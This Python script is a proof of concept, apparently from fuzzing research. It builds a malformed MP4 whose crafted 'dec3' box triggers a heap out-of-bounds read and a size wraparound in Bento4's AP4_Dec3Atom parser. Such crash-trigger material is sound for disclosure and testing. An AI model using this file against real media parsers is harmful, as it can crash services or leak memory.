#!/usr/bin/env python3
"""
VULN-001: Heap Over-Read in AP4_Dec3Atom Constructor
CWE-125: Out-of-bounds Read

Trigger: crafted dec3 box where:
  - payload[1] bits[2:0] = 7 → substream_count = 8
  - After DataRate skip (2 bytes), payload_size = 3
  - payload[2] (= original payload[4]) bits[4:1] non-zero → num_dep_sub != 0
  - Code reads payload[3] (= original payload[5]) → OOB (only 3 bytes valid)
  - payload_size -= 4 → unsigned wrap to 0xFFFFFFFC → 7 more OOB iterations
"""

import struct
import os

def pack_box(box_type, payload):
    """Pack a standard box: size(4B) + type(4B) + payload"""
    assert len(box_type) == 4
    size = 8 + len(payload)
    return struct.pack('>I', size) + box_type + payload

def pack_fullbox(box_type, version, flags, payload):
    """Pack a FullBox: size(4B) + type(4B) + version(1B) + flags(3B) + payload"""
    fb = (struct.pack('>B', version) +
          struct.pack('>I', flags & 0xFFFFFF)[1:4] +  # 3 bytes flags
          payload)
    return pack_box(box_type, fb)


# =====================================================================
# Build the crafted dec3 box (13 bytes total)
# =====================================================================
# Original payload (5 bytes):
#   [0] = 0x00  → DataRate high byte
#   [1] = 0x07  → DataRate low (bits[7:3]) + substream_count (bits[2:0]=7) → count=8
#   [2] = 0x00  → loop iter 0 byte 0 (fscod/bsid bits)
#   [3] = 0x00  → loop iter 0 byte 1 (bsmod/acmod/lfeon bits)
#   [4] = 0x02  → loop iter 0 byte 2: (0x02>>1)&0xF = 1 → num_dep_sub=1 (non-zero!)
#                  → code then reads payload[3] = original[5] → OOB read!
dec3_payload = bytes([0x00, 0x07, 0x00, 0x00, 0x02])
assert len(dec3_payload) == 5
dec3_box = struct.pack('>I', 13) + b'dec3' + dec3_payload
assert len(dec3_box) == 13


# =====================================================================
# EC-3 audio sample entry (box type b'ec-3')
# AudioSampleEntry layout (ISO 14496-12):
#   6 bytes  reserved
#   2 bytes  data_reference_index
#   8 bytes  reserved
#   2 bytes  channel_count
#   2 bytes  sample_size
#   2 bytes  pre_defined
#   2 bytes  reserved
#   4 bytes  sample_rate (16.16 fixed-point: 0x0BB80000 = 48000.0)
# Then child boxes follow.
# =====================================================================
audio_sample_entry_header = (
    b'\x00' * 6 +                          # reserved (6)
    struct.pack('>H', 1) +                 # data_reference_index = 1
    b'\x00' * 8 +                          # reserved (8)
    struct.pack('>H', 2) +                 # channel_count = 2
    struct.pack('>H', 16) +                # sample_size = 16 bits
    struct.pack('>H', 0) +                 # pre_defined = 0
    struct.pack('>H', 0) +                 # reserved = 0
    struct.pack('>HH', 48000, 0)           # sample_rate = 48000.0 (16.16)
)
ec3_entry_payload = audio_sample_entry_header + dec3_box
ec3_entry = pack_box(b'ec-3', ec3_entry_payload)


# =====================================================================
# stsd (FullBox, version=0, flags=0): entry_count=1, then entries
# =====================================================================
stsd = pack_fullbox(b'stsd', 0, 0, struct.pack('>I', 1) + ec3_entry)


# =====================================================================
# stts (FullBox): 1 entry: sample_count=1, sample_delta=1024
# =====================================================================
stts = pack_fullbox(b'stts', 0, 0,
    struct.pack('>I', 1) +              # entry_count = 1
    struct.pack('>II', 1, 1024))        # count=1, delta=1024


# =====================================================================
# stsc (FullBox): 1 entry: first_chunk=1, samples/chunk=1, desc_idx=1
# =====================================================================
stsc = pack_fullbox(b'stsc', 0, 0,
    struct.pack('>I', 1) +              # entry_count = 1
    struct.pack('>III', 1, 1, 1))       # first_chunk, samples_per_chunk, desc_idx


# =====================================================================
# stsz (FullBox): uniform sample size=0 (per-entry), count=1, entry=[100]
# =====================================================================
stsz = pack_fullbox(b'stsz', 0, 0,
    struct.pack('>II', 0, 1) +          # sample_size=0, sample_count=1
    struct.pack('>I', 100))             # entry_size[0] = 100


# =====================================================================
# stco (FullBox): 1 chunk offset entry (placeholder, fixed later)
# =====================================================================
def make_stco(offset):
    return pack_fullbox(b'stco', 0, 0,
        struct.pack('>I', 1) +          # entry_count = 1
        struct.pack('>I', offset))      # chunk_offset


# Placeholder stco to measure sizes
stco_placeholder = make_stco(0)
stbl_placeholder = pack_box(b'stbl', stsd + stts + stsc + stsz + stco_placeholder)


# =====================================================================
# url (FullBox, flags=1 = self-contained, no location string)
# =====================================================================
url_box = pack_fullbox(b'url ', 0, 1, b'')

# =====================================================================
# dref (FullBox): contains 1 url entry
# =====================================================================
dref = pack_fullbox(b'dref', 0, 0, struct.pack('>I', 1) + url_box)

# =====================================================================
# dinf: contains dref
# =====================================================================
dinf = pack_box(b'dinf', dref)

# =====================================================================
# smhd (FullBox): balance=0, reserved=0
# =====================================================================
smhd = pack_fullbox(b'smhd', 0, 0, struct.pack('>HH', 0, 0))

# =====================================================================
# minf: smhd + dinf + stbl
# =====================================================================
minf_placeholder = pack_box(b'minf', smhd + dinf + stbl_placeholder)

# =====================================================================
# mdhd (FullBox, version=0):
#   creation_time(4B), modification_time(4B), timescale(4B), duration(4B)
#   language(2B), pre_defined(2B)
# =====================================================================
mdhd = pack_fullbox(b'mdhd', 0, 0,
    struct.pack('>IIII', 0, 0, 44100, 1000) +  # times, timescale=44100, duration=1000
    struct.pack('>HH', 0x55C4, 0))              # language=und, pre_defined=0

# =====================================================================
# hdlr (FullBox):
#   pre_defined(4B)=0, handler_type(4B)='soun', reserved(12B)=0, name(str+NUL)
# =====================================================================
hdlr = pack_fullbox(b'hdlr', 0, 0,
    struct.pack('>I', 0) +     # pre_defined
    b'soun' +                   # handler_type
    b'\x00' * 12 +             # reserved
    b'Sound\x00')              # name

# =====================================================================
# mdia: mdhd + hdlr + minf
# =====================================================================
mdia_placeholder = pack_box(b'mdia', mdhd + hdlr + minf_placeholder)

# =====================================================================
# tkhd (FullBox, version=0, flags=3=enabled+in-movie):
#   creation_time(4B), modification_time(4B), track_id(4B), reserved(4B),
#   duration(4B), reserved(8B), layer(2B), alternate_group(2B),
#   volume(2B), reserved(2B), matrix(36B), width(4B), height(4B)
# =====================================================================
identity_matrix = (
    struct.pack('>I', 0x00010000) + struct.pack('>I', 0) + struct.pack('>I', 0) +
    struct.pack('>I', 0) + struct.pack('>I', 0x00010000) + struct.pack('>I', 0) +
    struct.pack('>I', 0) + struct.pack('>I', 0) + struct.pack('>I', 0x40000000)
)
tkhd = pack_fullbox(b'tkhd', 0, 3,
    struct.pack('>IIIII', 0, 0, 1, 0, 1000) +  # times, track_id=1, reserved, duration=1000
    b'\x00' * 8 +                               # reserved
    struct.pack('>HHH', 0, 0, 0x0100) +         # layer, alternate_group, volume
    struct.pack('>H', 0) +                       # reserved
    identity_matrix +                            # matrix (36 bytes)
    struct.pack('>II', 0, 0))                    # width, height

# =====================================================================
# trak: tkhd + mdia
# =====================================================================
trak_placeholder = pack_box(b'trak', tkhd + mdia_placeholder)

# =====================================================================
# mvhd (FullBox, version=0):
#   creation_time(4B), modification_time(4B), timescale(4B), duration(4B),
#   rate(4B)=0x00010000, volume(2B)=0x0100, reserved(10B),
#   matrix(36B), pre_defined(24B), next_track_id(4B)=2
# =====================================================================
mvhd = pack_fullbox(b'mvhd', 0, 0,
    struct.pack('>IIII', 0, 0, 1000, 1000) +   # times, timescale=1000, duration=1000
    struct.pack('>I', 0x00010000) +             # rate = 1.0
    struct.pack('>H', 0x0100) +                 # volume = 1.0
    b'\x00' * 10 +                              # reserved
    identity_matrix +                            # matrix (36 bytes)
    b'\x00' * 24 +                              # pre_defined
    struct.pack('>I', 2))                        # next_track_id = 2

# =====================================================================
# moov: mvhd + trak
# =====================================================================
moov_placeholder = pack_box(b'moov', mvhd + trak_placeholder)

# =====================================================================
# ftyp: brand='mp42', version=0, compatible=['mp42','isom']
# =====================================================================
ftyp = pack_box(b'ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')

# =====================================================================
# mdat: 100 bytes of dummy audio data
# =====================================================================
mdat_header_size = 8  # size(4) + type(4)
mdat_data = b'\x00' * 100
mdat = pack_box(b'mdat', mdat_data)

# =====================================================================
# Compute correct stco offset:
# The chunk offset should point to the start of the mdat payload
# (not the mdat box header). i.e., byte position of data after mdat header.
# =====================================================================
mdat_offset = len(ftyp) + len(moov_placeholder) + mdat_header_size

# Rebuild everything with the corrected stco offset
stco_fixed = make_stco(mdat_offset)
stbl_fixed = pack_box(b'stbl', stsd + stts + stsc + stsz + stco_fixed)
minf_fixed = pack_box(b'minf', smhd + dinf + stbl_fixed)
mdia_fixed = pack_box(b'mdia', mdhd + hdlr + minf_fixed)
trak_fixed = pack_box(b'trak', tkhd + mdia_fixed)
moov_fixed = pack_box(b'moov', mvhd + trak_fixed)

# Verify sizes match (stco, stbl, minf, mdia, trak, moov have same size since stco offset doesn't change box sizes)
assert len(moov_fixed) == len(moov_placeholder), \
    f"moov size mismatch: {len(moov_fixed)} vs {len(moov_placeholder)}"

# Final file
output = ftyp + moov_fixed + mdat

# Write output
out_dir = '/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Dec3Atom_h'
out_path = os.path.join(out_dir, 'vuln_001.mp4')
os.makedirs(out_dir, exist_ok=True)
with open(out_path, 'wb') as f:
    f.write(output)

print(f"Written {len(output)} bytes to {out_path}")
print(f"  ftyp:          {len(ftyp)} bytes")
print(f"  moov:          {len(moov_fixed)} bytes")
print(f"  mdat:          {len(mdat)} bytes")
print(f"  mdat_offset:   {mdat_offset} (chunk data starts here)")
print(f"  dec3 box:      13 bytes, 5-byte payload")
print(f"  substream_count = 8 (will read 8 OOB after first iteration wraps payload_size)")
